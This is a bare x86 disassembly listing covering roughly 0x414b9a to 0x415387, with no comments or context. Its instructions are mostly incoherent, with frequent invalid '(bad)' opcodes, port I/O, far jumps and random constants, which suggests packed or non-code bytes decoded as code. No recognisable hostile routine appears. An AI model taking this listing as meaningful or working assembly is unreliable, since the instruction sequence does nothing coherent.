  414b9a:	mov    ds,WORD PTR [edi+0x2f]
  414b9d:	mov    es,WORD PTR [edi+0x5f]
  414ba0:	rol    DWORD PTR [ebx+0x3b8688],cl
  414ba6:	mov    esi,0x1e402e55
  414bab:	ror    DWORD PTR [edi],0xfa
  414bae:	lods   al,BYTE PTR ds:[esi]
  414baf:	inc    esp
  414bb0:	mov    ecx,DWORD PTR [eax+0x7d830de9]
  414bb6:	dec    ecx
  414bb7:	or     eax,0xdeba47a3
  414bbc:	mov    dl,0x82
  414bbe:	pop    ds
  414bbf:	imul   eax,DWORD PTR [eax],0xffffffd0
  414bc2:	mov    bl,0x65
  414bc4:	push   esi
  414bc5:	pop    ds
  414bc6:	or     dh,BYTE PTR [esp+edi*2]
  414bc9:	sub    DWORD PTR [esi+ebp*1],edi
  414bcc:	dec    eax
  414bcd:	cmp    al,0xb8
  414bcf:	mov    ebp,0xe44d9974
  414bd5:	xor    edi,DWORD PTR [ebx+eiz*1-0x13]
  414bd9:	xor    DWORD PTR [esi+0x7e],edx
  414bdc:	pop    ebp
  414bdd:	jecxz  0x414c2e
  414bdf:	pop    eax
  414be0:	test   al,0xf8
  414be2:	enter  0x6da7,0x18
  414be6:	sar    DWORD PTR [eax+ebp*4-0x6f],0x36
  414beb:	into   
  414bec:	xchg   esp,eax
  414bed:	pop    esi
  414bee:	in     eax,0x4f
  414bf0:	mov    eax,ds:0x724eaf6
  414bf5:	mov    ebx,0xa3566a21
  414bfa:	sub    al,bl
  414bfc:	add    al,0x7d
  414bfe:	pop    ecx
  414bff:	xchg   ecx,eax
  414c00:	inc    ebp
  414c01:	and    al,0x2a
  414c03:	jl     0x414bd2
  414c05:	add    DWORD PTR [eax+eax*8+0x50],ebx
  414c09:	shl    DWORD PTR [esp+ebx*8],cl
  414c0c:	out    0x7e,al
  414c0e:	xchg   ecx,eax
  414c0f:	jae    0x414c3b
  414c11:	lea    ebp,[ebx-0x36]
  414c14:	pop    edi
  414c15:	das    
  414c16:	dec    ecx
  414c17:	outs   dx,BYTE PTR ds:[esi]
  414c18:	retf   0x1888
  414c1b:	aaa    
  414c1c:	aam    0x8a
  414c1e:	clc    
  414c1f:	mov    bl,0x8e
  414c21:	ins    DWORD PTR es:[edi],dx
  414c22:	push   0x74
  414c24:	iret   
  414c25:	scas   eax,DWORD PTR es:[edi]
  414c26:	inc    esp
  414c27:	or     DWORD PTR [edi-0x3e],esi
  414c2a:	loopne 0x414c3a
  414c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c2d:	xchg   BYTE PTR ds:0x61a82b6,dh
  414c33:	(bad)  
  414c34:	mov    cl,0x62
  414c36:	dec    ecx
  414c37:	add    ch,BYTE PTR [esi]
  414c39:	add    ebp,DWORD PTR ds:0x269eef6b
  414c3f:	div    BYTE PTR [esi-0x6f268eec]
  414c45:	xchg   esp,eax
  414c46:	ror    BYTE PTR [edx-0x2187e45b],0x75
  414c4d:	pop    eax
  414c4e:	rol    DWORD PTR [ecx+0x124b93eb],0xeb
  414c55:	sub    al,0x76
  414c57:	jmp    ecx
  414c59:	xchg   ecx,eax
  414c5a:	mov    dh,0x51
  414c5c:	in     eax,dx
  414c5d:	arpl   WORD PTR [edi+0x4be75619],cx
  414c63:	jnp    0x414cc1
  414c65:	inc    ebp
  414c66:	push   0x9117d15c
  414c6b:	push   ds
  414c6c:	out    0x5c,eax
  414c6e:	ds cmc 
  414c70:	cmp    ebp,DWORD PTR [esi+0x5e30e442]
  414c76:	add    DWORD PTR [ebp-0x2d],0xffffffba
  414c7a:	imul   esp,esi,0x28
  414c7d:	enter  0xb7d8,0x3b
  414c81:	pop    edi
  414c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c83:	fisub  DWORD PTR [eax]
  414c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c86:	sub    BYTE PTR [eax-0x79],dl
  414c89:	inc    ebp
  414c8a:	and    DWORD PTR [ecx-0x78],ebp
  414c8d:	and    eax,0x84c83acd
  414c92:	(bad)  
  414c93:	repnz pop edx
  414c95:	data16 add bl,0x25
  414c99:	xchg   ecx,eax
  414c9a:	rcr    al,0x9
  414c9d:	enter  0xba21,0x49
  414ca1:	jne    0x414c65
  414ca3:	mov    edx,0xd9b60019
  414ca8:	sbb    eax,0xdef8e4a0
  414cad:	push   ebx
  414cae:	dec    ebp
  414caf:	mov    bl,0xbe
  414cb1:	add    dl,BYTE PTR [ebx+edi*4+0x2d1924be]
  414cb8:	ins    BYTE PTR es:[edi],dx
  414cb9:	retf   0x4127
  414cbc:	mov    dh,0x80
  414cbe:	cli    
  414cbf:	xor    ebp,DWORD PTR [edi]
  414cc1:	test   BYTE PTR [eax-0x76135c7a],0x60
  414cc8:	dec    esp
  414cc9:	lea    eax,[eax]
  414ccb:	push   edi
  414ccc:	sar    DWORD PTR [esp+esi*1-0x5450cb4],cl
  414cd3:	pop    ebp
  414cd4:	test   edx,ebx
  414cd6:	sub    al,0xe3
  414cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd9:	repnz pop ds
  414cdb:	mov    edi,0x533e65e7
  414ce0:	mov    al,0x73
  414ce2:	dec    edx
  414ce3:	jg     0x414ce5
  414ce5:	sbb    ebx,DWORD PTR [edx-0xa]
  414ce8:	push   ecx
  414ce9:	pusha  
  414cea:	and    ebx,edi
  414cec:	and    al,bl
  414cee:	ja     0x414cf8
  414cf0:	idiv   esp
  414cf2:	sub    eax,0xfb387b98
  414cf7:	lahf   
  414cf8:	cdq    
  414cf9:	repnz xor esi,DWORD PTR [eax-0x2d]
  414cfd:	push   ebp
  414cfe:	mov    ds:0xbb3f1de,eax
  414d03:	add    BYTE PTR gs:[ecx],dl
  414d06:	jle    0x414d57
  414d08:	ss stos DWORD PTR es:[edi],eax
  414d0a:	shl    DWORD PTR [edi+eax*4],1
  414d0d:	loop   0x414d7f
  414d0f:	mov    esi,ebx
  414d11:	jmp    0xfa5c:0xa810e5e4
  414d18:	xchg   esp,eax
  414d19:	sub    eax,ebx
  414d1b:	sbb    ebp,0x42
  414d1e:	pop    ecx
  414d1f:	daa    
  414d20:	push   ebp
  414d21:	push   ebx
  414d22:	(bad)  
  414d23:	jno    0x414d24
  414d25:	mov    ebx,0x36bd41b9
  414d2a:	test   eax,0x446302c2
  414d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d30:	rcl    BYTE PTR [esi-0x1c],cl
  414d33:	mov    dl,0x80
  414d35:	enter  0x69c4,0x64
  414d39:	arpl   WORD PTR [edi+0x52a93c57],bx
  414d3f:	sar    BYTE PTR [ebp+esi*1-0x37df3ed5],1
  414d46:	dec    ebp
  414d47:	and    DWORD PTR [ebx+0x58],esp
  414d4a:	mov    ecx,0xc802389f
  414d4f:	sbb    eax,0xfd7c170
  414d54:	fstp   TBYTE PTR [esi+ebp*1]
  414d57:	and    cl,ah
  414d59:	ficomp DWORD PTR gs:[edx]
  414d5c:	(bad)  
  414d5d:	xor    al,0x9a
  414d5f:	das    
  414d60:	add    ch,bl
  414d62:	(bad)  
  414d63:	ds xor eax,0x62e86717
  414d69:	mov    ebp,0xc6c5ca47
  414d6e:	hlt    
  414d6f:	fs pushf 
  414d71:	shl    bl,1
  414d73:	adc    ecx,DWORD PTR [edi+ebp*4-0x7cc56751]
  414d7a:	sbb    BYTE PTR [edx-0x7232a78d],bh
  414d80:	mov    ecx,0x52bb0eac
  414d85:	leave  
  414d86:	sti    
  414d87:	ins    BYTE PTR es:[edi],dx
  414d88:	jmp    0x535abc29
  414d8d:	(bad)  
  414d8f:	add    BYTE PTR [eax],bh
  414d91:	inc    esp
  414d92:	pop    ss
  414d93:	shl    BYTE PTR [edx+0x500a855c],cl
  414d99:	mov    BYTE PTR [ebx-0x8],bh
  414d9c:	adc    al,0xc5
  414d9e:	rol    DWORD PTR [edi-0x33],1
  414da1:	fwait
  414da2:	dec    ebx
  414da3:	jge    0x414dfb
  414da5:	jecxz  0x414d32
  414da7:	imul   edi,DWORD PTR [esi],0x3dd5680c
  414dad:	pop    eax
  414dae:	mov    edi,0xc99e0a35
  414db3:	retf   0x5b75
  414db6:	fld1   
  414db8:	call   0x412a7f5a
  414dbd:	ins    BYTE PTR es:[edi],dx
  414dbe:	mov    BYTE PTR fs:[ebp-0x1864f06e],ah
  414dc5:	jecxz  0x414dd8
  414dc7:	je     0x414da8
  414dc9:	(bad)  
  414dca:	adc    dl,BYTE PTR [ebx-0x5dae720a]
  414dd0:	loopne 0x414dbc
  414dd2:	ret    0x3b6a
  414dd5:	or     al,0x12
  414dd7:	push   edi
  414dd8:	lods   eax,DWORD PTR ds:[esi]
  414dd9:	mov    eax,DWORD PTR [ecx+ebp*8]
  414ddc:	mov    eax,ds:0x5d8090cd
  414de1:	je     0x414dc0
  414de3:	xor    esp,DWORD PTR [ebx-0x74]
  414de6:	pop    ds
  414de7:	int3   
  414de8:	or     BYTE PTR [edi-0x80],bh
  414deb:	jnp    0x414e61
  414ded:	push   esp
  414dee:	in     eax,dx
  414def:	ret    0x959b
  414df2:	sbb    ebx,ebx
  414df4:	ja     0x414dea
  414df6:	add    ebp,0xeb4c35e2
  414dfc:	add    DWORD PTR [eax-0x281c565e],esp
  414e02:	scas   eax,DWORD PTR es:[edi]
  414e03:	je     0x414e46
  414e05:	int3   
  414e06:	aam    0xb3
  414e08:	data16 lods al,BYTE PTR es:[esi]
  414e0b:	aad    0x8d
  414e0d:	and    al,0xff
  414e0f:	les    edi,FWORD PTR [ecx]
  414e11:	dec    esp
  414e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e13:	sahf   
  414e14:	enter  0xc38e,0xdb
  414e18:	stos   BYTE PTR es:[edi],al
  414e19:	(bad)  
  414e1b:	lahf   
  414e1c:	push   ebx
  414e1d:	pop    eax
  414e1e:	fisttp QWORD PTR [edi-0x35]
  414e21:	lahf   
  414e22:	mov    DWORD PTR [ebp-0x50c86f76],ebx
  414e28:	daa    
  414e29:	fisubr WORD PTR [ebx-0x48]
  414e2c:	cmp    ah,dh
  414e2e:	in     al,0x21
  414e30:	sbb    cl,dl
  414e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e33:	enter  0x9f53,0xc2
  414e37:	data16 hlt 
  414e39:	jl     0x414e06
  414e3b:	arpl   WORD PTR [edx-0x3f3a8eab],di
  414e41:	test   DWORD PTR [edi],esp
  414e43:	xchg   ebp,eax
  414e44:	sbb    eax,0x2c047e7c
  414e49:	inc    eax
  414e4a:	(bad)  [edi+0x6f0c655a]
  414e50:	mov    cl,0xfe
  414e52:	add    DWORD PTR [edx-0x377cbf69],edx
  414e58:	retf   0xb5a6
  414e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e5c:	inc    eax
  414e5d:	iret   
  414e5e:	sti    
  414e5f:	shl    BYTE PTR [ebp-0x39],1
  414e62:	test   eax,0x7c7eb21d
  414e67:	xor    esp,DWORD PTR [edi-0x4573b3cb]
  414e6d:	out    dx,al
  414e6e:	stos   DWORD PTR es:[edi],eax
  414e6f:	push   esp
  414e70:	test   eax,0xa8cd2ca9
  414e75:	cmc    
  414e76:	inc    esi
  414e77:	pop    ds
  414e78:	mov    edi,0x6d663fee
  414e7d:	(bad)  
  414e7f:	imul   BYTE PTR [ebp+0x2f]
  414e82:	jecxz  0x414ecb
  414e84:	ss mov esi,0x66902e9f
  414e8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e8b:	pusha  
  414e8c:	cld    
  414e8d:	out    dx,al
  414e8e:	xlat   BYTE PTR ds:[ebx]
  414e8f:	and    edx,esp
  414e91:	sub    DWORD PTR [edi],ecx
  414e93:	in     al,0xe1
  414e95:	mov    ah,0xbe
  414e97:	inc    edx
  414e98:	(bad)  
  414e99:	dec    eax
  414e9a:	imul   eax,DWORD PTR [esi],0x29a1980b
  414ea0:	jne    0x414eb4
  414ea2:	jnp    0x414eea
  414ea4:	aas    
  414ea5:	jno    0x414eed
  414ea7:	dec    ebp
  414ea8:	mov    ?,WORD PTR [ecx-0x23]
  414eab:	or     al,0x8e
  414ead:	adc    eax,0xe7d51c8e
  414eb2:	fisubr DWORD PTR [ebx+0x520ca993]
  414eb8:	and    eax,0x5214704d
  414ebd:	jge    0x414f2e
  414ebf:	retf   0x308a
  414ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ec3:	mov    ebp,0xfafd607d
  414ec8:	dec    ebx
  414ec9:	add    BYTE PTR [ebx],bl
  414ecb:	inc    ebx
  414ecc:	xchg   esi,eax
  414ecd:	fimul  DWORD PTR [edx-0x4]
  414ed0:	(bad)  
  414ed1:	mov    esi,DWORD PTR [esi-0x5c69b3c5]
  414ed7:	repz aad 0x9
  414eda:	mov    edx,0xde884515
  414edf:	cmp    esp,DWORD PTR [eax+0x6d63382f]
  414ee5:	jge    0x414e86
  414ee7:	popa   
  414ee8:	and    eax,0x351498d6
  414eed:	inc    edi
  414eee:	push   edi
  414eef:	sub    DWORD PTR [ecx+eiz*1+0x1b526053],ebp
  414ef6:	fsub   st(0),st
  414ef8:	push   ss
  414ef9:	mov    ds:0xcdb65a3e,al
  414efe:	xchg   BYTE PTR [ecx],bh
  414f00:	sbb    BYTE PTR [ebp-0x48b6715c],ah
  414f06:	shr    BYTE PTR [ecx+0x9c6926d],0xea
  414f0d:	dec    esp
  414f0e:	sub    eax,0x8f54a5b3
  414f13:	shl    bl,1
  414f15:	cmp    edx,DWORD PTR [ebx]
  414f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f18:	jge    0x414ecc
  414f1a:	mov    dl,0x65
  414f1c:	push   0x42
  414f1e:	mov    al,0x55
  414f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f21:	xor    al,0xed
  414f23:	sbb    ecx,DWORD PTR [ebx]
  414f25:	or     al,0xaa
  414f27:	jb     0x414f13
  414f29:	pop    edx
  414f2a:	fnsave [ebx]
  414f2c:	mov    bl,0x7e
  414f2e:	mov    BYTE PTR [edi+0x4e],dh
  414f31:	hlt    
  414f32:	pop    esp
  414f33:	sub    BYTE PTR [esp+edi*1+0x4e],cl
  414f37:	pop    edx
  414f38:	repz push eax
  414f3a:	sub    BYTE PTR [ecx],bl
  414f3c:	in     eax,0x3e
  414f3e:	lea    esp,[ebp-0x23e86876]
  414f44:	push   esp
  414f45:	mov    ?,WORD PTR [edi]
  414f47:	mov    edi,0x5308389e
  414f4c:	retf   0x589c
  414f4f:	addr16 jae 0x414f30
  414f52:	ror    DWORD PTR [esp+eax*4],1
  414f55:	fsub   DWORD PTR [esi-0x4178266]
  414f5b:	out    0x69,eax
  414f5d:	enter  0x71d0,0x12
  414f61:	dec    ecx
  414f62:	jb     0x414ef9
  414f64:	daa    
  414f65:	stc    
  414f66:	out    dx,eax
  414f67:	lds    ebp,FWORD PTR [esi+0x24d7441d]
  414f6d:	call   0xd802aae8
  414f72:	xchg   ebx,eax
  414f73:	push   ebx
  414f74:	jmp    0x414f48
  414f76:	pop    ds
  414f77:	inc    ecx
  414f78:	cmp    ch,BYTE PTR [ebx+0x41]
  414f7b:	jg     0x414fc3
  414f7d:	jmp    0xf2522a97
  414f82:	jne    0x414f2e
  414f84:	pop    edx
  414f85:	imul   edx,DWORD PTR ds:0xfa33184e,0x8c32baad
  414f8f:	jl     0x414f1b
  414f91:	cmp    DWORD PTR [eax],edx
  414f93:	cwde   
  414f94:	addr16 dec ebp
  414f96:	or     ecx,esp
  414f98:	xchg   edx,eax
  414f99:	aaa    
  414f9a:	sti    
  414f9b:	ret    0x3349
  414f9e:	jne    0x414fb6
  414fa0:	ins    BYTE PTR es:[edi],dx
  414fa1:	xor    eax,0x43fe1be7
  414fa6:	adc    eax,0xe790c75e
  414fab:	ror    BYTE PTR [esi+0x32],0xe4
  414faf:	dec    ecx
  414fb0:	adc    BYTE PTR [edx+0x3a],ah
  414fb3:	fwait
  414fb4:	lods   al,BYTE PTR ds:[esi]
  414fb5:	sub    al,0xca
  414fb7:	cs xchg edi,eax
  414fb9:	and    al,0x36
  414fbb:	test   BYTE PTR [esi+0x782c3bec],bh
  414fc1:	(bad)
  414fc4:	push   ss
  414fc5:	xor    DWORD PTR [edi+0x614933f0],ecx
  414fcb:	pop    ecx
  414fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fcd:	(bad)  
  414fcf:	mov    ah,dl
  414fd1:	sub    BYTE PTR [esi+0x148e1793],0x15
  414fd8:	push   eax
  414fd9:	or     al,0xeb
  414fdb:	xchg   BYTE PTR [ebp-0x2a5ce28c],bl
  414fe1:	stos   DWORD PTR es:[edi],eax
  414fe2:	addr16 cdq 
  414fe4:	inc    edi
  414fe5:	inc    ebx
  414fe6:	add    ch,bh
  414fe8:	mov    ecx,0xeb46e7df
  414fed:	sub    al,0x4f
  414fef:	(bad)  
  414ff0:	or     esp,DWORD PTR [eax+0x2eba9840]
  414ff6:	aad    0x62
  414ff8:	std    
  414ff9:	je     0x41502b
  414ffb:	cmp    DWORD PTR [esi+0x4e628392],eax
  415001:	mov    bl,0xe3
  415003:	lock cdq 
  415005:	mov    ebx,0x6b2fdfc3
  41500a:	lahf   
  41500b:	test   DWORD PTR [eax+0x78],ecx
  41500e:	es mov dh,0x66
  415011:	mov    bl,0x9b
  415013:	xor    DWORD PTR [esi],edx
  415015:	jmp    0xc8c9:0x9e098023
  41501c:	(bad)  
  41501d:	(bad)  
  41501f:	dec    edi
  415020:	jae    0x414ff2
  415022:	adc    al,0x20
  415024:	and    BYTE PTR [eax+0x745b78dc],bh
  41502a:	aam    0x13
  41502c:	das    
  41502d:	leave  
  41502e:	and    BYTE PTR [edx+ecx*1-0x4],cl
  415032:	gs cld 
  415034:	icebp  
  415035:	loope  0x414ffb
  415037:	test   BYTE PTR [ecx],ah
  415039:	ins    BYTE PTR es:[edi],dx
  41503a:	outs   dx,BYTE PTR ds:[esi]
  41503b:	in     eax,0xe8
  41503d:	fldl2t 
  41503f:	add    eax,0x5fe065a9
  415044:	xor    cl,BYTE PTR [edi-0x69]
  415047:	jb     0x415075
  415049:	dec    eax
  41504a:	shr    DWORD PTR [edi-0x10],0x91
  41504e:	ds out dx,eax
  415050:	inc    ebp
  415051:	adc    esi,ebp
  415053:	mov    DWORD PTR [ecx],ebx
  415055:	and    ch,ch
  415057:	xlat   BYTE PTR ds:[ebx]
  415058:	dec    edi
  415059:	loopne 0x414fff
  41505b:	mov    ch,al
  41505d:	es out dx,eax
  41505f:	pop    ss
  415060:	sbb    al,0x91
  415062:	sub    ebx,DWORD PTR [esi]
  415064:	sub    BYTE PTR [ebx+0xb3809e5],al
  41506a:	xor    al,0x29
  41506c:	retf   
  41506d:	xor    eax,0xdb12918f
  415072:	adc    al,0x53
  415074:	push   ebp
  415075:	jp     0x4150a7
  415077:	xchg   esp,eax
  415078:	scas   al,BYTE PTR es:[edi]
  415079:	ret    0x1ea3
  41507c:	(bad)  
  41507d:	jmp    0x41503b
  41507f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415080:	int3   
  415081:	cmp    eax,0xda0cb12b
  415086:	adc    BYTE PTR [ebx],0xb3
  415089:	loope  0x4150fb
  41508b:	aad    0x23
  41508d:	add    DWORD PTR [ecx+0x2e],0x63956dcf
  415094:	std    
  415095:	sub    edx,DWORD PTR [eax]
  415097:	js     0x4150ce
  415099:	lock mov eax,ds:0x54b9ddfa
  41509f:	mov    al,BYTE PTR [esi-0x1d]
  4150a2:	and    ebx,DWORD PTR [edx+0x1a]
  4150a5:	mov    esi,0xe34a6114
  4150aa:	jle    0x4150e4
  4150ac:	mov    eax,ds:0xe8f1e6ed
  4150b1:	dec    esi
  4150b2:	aas    
  4150b3:	sub    al,0x6e
  4150b5:	adc    eax,0x9bef05e2
  4150ba:	inc    esp
  4150bb:	mov    BYTE PTR [edx+0x4daad139],ah
  4150c1:	jne    0x415062
  4150c3:	or     al,0x1f
  4150c5:	and    eax,0xbd56fdbd
  4150ca:	add    cl,bl
  4150cc:	jno    0x415081
  4150ce:	push   eax
  4150cf:	cdq    
  4150d0:	inc    ebp
  4150d1:	pop    ecx
  4150d2:	pop    edx
  4150d3:	ins    DWORD PTR es:[edi],dx
  4150d4:	test   eax,0xc426913a
  4150d9:	mov    ecx,0x8c42a232
  4150de:	xchg   ebx,eax
  4150df:	add    dl,BYTE PTR [eax]
  4150e1:	aas    
  4150e2:	inc    ebx
  4150e3:	xchg   edx,eax
  4150e4:	add    bh,BYTE PTR [edi-0x423ab715]
  4150ea:	sub    bl,ah
  4150ec:	stos   BYTE PTR es:[edi],al
  4150ed:	idiv   esp
  4150ef:	adc    BYTE PTR [edx+0x47],ch
  4150f2:	sbb    ebp,DWORD PTR [esp+ebp*1+0x550b3a32]
  4150f9:	sub    bl,BYTE PTR [eax-0x33ca0c6f]
  4150ff:	in     al,dx
  415100:	repz clc 
  415102:	aad    0xf3
  415104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415105:	aad    0x71
  415107:	icebp  
  415108:	sub    cl,bh
  41510a:	add    al,BYTE PTR [ebx-0x26]
  41510d:	je     0x415115
  41510f:	je     0x415111
  415111:	jmp    0xea9f8f4e
  415116:	xchg   esp,eax
  415117:	adc    eax,0xe7eaaeb1
  41511c:	push   edx
  41511d:	clc    
  41511e:	test   dl,ch
  415120:	mov    WORD PTR [eax],ds
  415122:	push   ebp
  415123:	ins    BYTE PTR es:[edi],dx
  415124:	stos   BYTE PTR es:[edi],al
  415125:	(bad)  
  415126:	sub    ebp,DWORD PTR [ecx+edi*1-0x4528d681]
  41512d:	jecxz  0x415159
  41512f:	retf   
  415130:	mov    edi,0x827f04b5
  415135:	push   edx
  415136:	imul   eax,DWORD PTR [esi-0x2b],0xdc61141
  41513d:	cwde   
  41513e:	fild   WORD PTR [esi-0x4db53956]
  415144:	xor    edx,DWORD PTR [ebx+0x32]
  415147:	cmp    DWORD PTR [ecx+0x7a1f3891],esp
  41514d:	cmp    eax,0xc830c3e7
  415152:	call   0xef59:0xf2f58536
  415159:	jnp    0x4151d0
  41515b:	or     ebp,esp
  41515d:	retf   0xc571
  415160:	xor    BYTE PTR [eax-0x26],ch
  415163:	and    dl,dl
  415165:	push   eax
  415166:	lods   eax,DWORD PTR ds:[esi]
  415167:	jb     0x41513c
  415169:	loope  0x415171
  41516b:	and    DWORD PTR [ecx+ebx*2+0x4acebc8],edx
  415172:	xchg   esp,eax
  415173:	or     BYTE PTR ds:0xffa5c716,dl
  415179:	lea    eax,[esi]
  41517b:	fistp  DWORD PTR [esi+ecx*8-0x1c]
  41517f:	cld    
  415180:	lea    ecx,[eax-0x43]
  415183:	es and al,0x93
  415186:	pop    esp
  415187:	sbb    ch,BYTE PTR [esi+0x41]
  41518a:	mov    DWORD PTR [edx-0x1f],ecx
  41518d:	dec    esp
  41518e:	test   al,0xa0
  415190:	hlt    
  415191:	pop    ecx
  415192:	jmp    0x191ff40b
  415197:	ss push eax
  415199:	cmp    ebp,DWORD PTR [ebx+eiz*1]
  41519c:	sti    
  41519d:	add    edx,DWORD PTR [ecx*2+0x175a1326]
  4151a4:	mov    ebx,0xb728c6a3
  4151a9:	cmp    BYTE PTR [eax+0x5b28d433],ah
  4151af:	aad    0xe0
  4151b1:	cmp    ah,BYTE PTR [ebx-0x2a]
  4151b4:	jmp    0x415225
  4151b6:	cwde   
  4151b7:	sbb    eax,0x3947e564
  4151bc:	cmp    cl,BYTE PTR [ecx-0xa]
  4151bf:	cdq    
  4151c0:	mov    cl,0xeb
  4151c2:	xor    al,0x97
  4151c4:	xor    dh,BYTE PTR [edi+0x2163943f]
  4151ca:	fcom   DWORD PTR [eax+0x574ddc96]
  4151d0:	sar    BYTE PTR [edi-0x501bcc6c],1
  4151d6:	test   eax,0x95da077
  4151db:	retf   
  4151dc:	jle    0x41523d
  4151de:	sub    BYTE PTR [edi-0x4220284d],al
  4151e4:	arpl   dx,sp
  4151e6:	inc    edx
  4151e7:	loope  0x415253
  4151e9:	jnp    0x415256
  4151eb:	popf   
  4151ec:	sub    ebp,DWORD PTR [esi+0x2d5db2a6]
  4151f2:	mov    BYTE PTR [ebp+0x6c57c86e],dl
  4151f8:	fwait
  4151f9:	jbe    0x415180
  4151fb:	ins    DWORD PTR es:[edi],dx
  4151fc:	div    DWORD PTR es:[esi]
  4151ff:	mov    bh,BYTE PTR [esi+0x697b57d7]
  415205:	xchg   ecx,eax
  415206:	push   ebp
  415207:	inc    edx
  415208:	pop    esp
  415209:	int    0x14
  41520b:	add    eax,0xe17a13d4
  415210:	xor    DWORD PTR [ebx],ebp
  415212:	loopne 0x41522d
  415214:	imul   esp,edi,0xfffffff1
  415217:	and    edi,0x7d
  41521a:	xchg   esi,eax
  41521b:	add    edx,ecx
  41521d:	adc    al,0xad
  41521f:	or     DWORD PTR [esi+0x3a],ebp
  415222:	xchg   ebx,eax
  415223:	mov    ecx,0x1739f773
  415228:	mov    di,0x6c42
  41522c:	push   cs
  41522d:	std    
  41522e:	pop    es
  41522f:	sar    DWORD PTR [esp+esi*4+0x7d7fa040],1
  415236:	repnz ror BYTE PTR [esi+0x4c],cl
  41523a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41523b:	adc    DWORD PTR [esi],edx
  41523d:	into   
  41523e:	jne    0x415257
  415240:	mov    ch,ch
  415242:	jle    0x4152af
  415244:	div    BYTE PTR fs:[eax]
  415247:	mov    BYTE PTR [ebp-0x3a],dh
  41524a:	bound  esp,QWORD PTR [eax-0x4f98bc00]
  415250:	je     0x415224
  415252:	dec    ebp
  415253:	imul   DWORD PTR [ecx]
  415255:	mov    ecx,0xacd68f78
  41525a:	ret    
  41525b:	cli    
  41525c:	daa    
  41525d:	cmp    BYTE PTR [ebp+0x2fe709ca],bh
  415263:	jbe    0x4152b0
  415265:	sahf   
  415266:	and    eax,0x18da4b4a
  41526b:	cdq    
  41526c:	out    0x80,eax
  41526e:	loopne 0x41527c
  415270:	neg    edx
  415272:	and    eax,0x1119d844
  415277:	push   ebx
  415278:	data16 jns 0x41521c
  41527b:	push   ebp
  41527c:	out    0x76,eax
  41527e:	add    BYTE PTR [edi-0x34],0xe9
  415282:	or     eax,0xe221c615
  415287:	or     DWORD PTR [ecx+0x29a52099],edi
  41528d:	and    al,0x86
  41528f:	mov    edi,0xd36fa146
  415294:	inc    esi
  415295:	aas    
  415296:	pcmpgtd mm4,QWORD PTR [ecx+0x1a0dd8e4]
  41529d:	mov    edx,DWORD PTR [edx]
  41529f:	repz sub esi,DWORD PTR [esi-0x41]
  4152a3:	repnz pop DWORD PTR [ebx+0x1a169f48]
  4152aa:	out    0xfd,eax
  4152ac:	int3   
  4152ad:	repz rcr al,cl
  4152b0:	inc    esi
  4152b1:	icebp  
  4152b2:	jno    0x415296
  4152b4:	cmp    bl,BYTE PTR [ecx+0x40]
  4152b7:	xor    al,BYTE PTR [esi]
  4152b9:	xor    bl,ch
  4152bb:	(bad)  
  4152bc:	repz int 0x9c
  4152bf:	dec    edi
  4152c0:	arpl   WORD PTR [ebx+0x3c5a2f65],ax
  4152c6:	push   ss
  4152c7:	mov    BYTE PTR [eax],ah
  4152c9:	call   0xc62:0x405c3ba7
  4152d0:	xor    BYTE PTR [ebp+ecx*4-0x306cbfa2],bl
  4152d7:	push   0x5
  4152d9:	adc    DWORD PTR [ebp-0x20],edi
  4152dc:	daa    
  4152dd:	xchg   edx,eax
  4152de:	fst    DWORD PTR [ecx*4-0x3fccfecf]
  4152e5:	test   eax,0x9e4263c8
  4152ea:	dec    edi
  4152eb:	lea    ebx,es:[edi-0x1c]
  4152ef:	or     dh,ch
  4152f1:	and    al,0x74
  4152f3:	call   0x4ff9:0xa9139033
  4152fa:	xor    eax,0x6d499eca
  4152ff:	jmp    0x48c50994
  415304:	and    eax,0xf34470ba
  415309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530a:	aas    
  41530b:	jg     0x415388
  41530d:	(bad)  
  41530e:	sbb    esi,DWORD PTR [edi*2+0x2fba5af]
  415315:	xchg   BYTE PTR [esi-0x4dff7458],ch
  41531b:	fisub  DWORD PTR [esi]
  41531d:	mov    esp,0xf3814ddf
  415322:	dec    edi
  415323:	pop    es
  415324:	int3   
  415325:	std    
  415326:	stos   BYTE PTR es:[edi],al
  415327:	mov    al,BYTE PTR [ecx+esi*2]
  41532a:	push   edx
  41532b:	dec    ecx
  41532c:	popf   
  41532d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41532e:	fwait
  41532f:	pop    esp
  415330:	inc    eax
  415331:	mov    al,ds:0xb9caf64
  415336:	inc    esi
  415337:	jo     0x4152db
  415339:	and    eax,0x49adbdf3
  41533e:	loopne 0x41539e
  415340:	fsubr  st(5),st
  415342:	jge    0x415332
  415344:	(bad)  
  415345:	iret   
  415346:	jmp    0xbcb9:0x6002fb84
  41534d:	inc    DWORD PTR [esi-0x553def9d]
  415353:	out    dx,eax
  415354:	xor    eax,0xc8101fb0
  415359:	pusha  
  41535a:	jge    0x415373
  41535c:	dec    ebx
  41535d:	(bad)  
  41535e:	fild   DWORD PTR [edx]
  415360:	leave  
  415361:	add    ecx,edx
  415363:	mov    ecx,0xf1bd7570
  415368:	adc    ebx,DWORD PTR [ebp-0x5983d635]
  41536e:	into   
  41536f:	sti    
  415370:	bound  eax,QWORD PTR [ebp+edi*8-0x23764739]
  415377:	enter  0xd13a,0x95
  41537b:	mov    cl,0x2
  41537d:	xor    DWORD PTR [ecx+0x782c7ec0],ecx
  415383:	shr    BYTE PTR [edi],0x20
  415386:	push   ss
  415387:	pop    ds
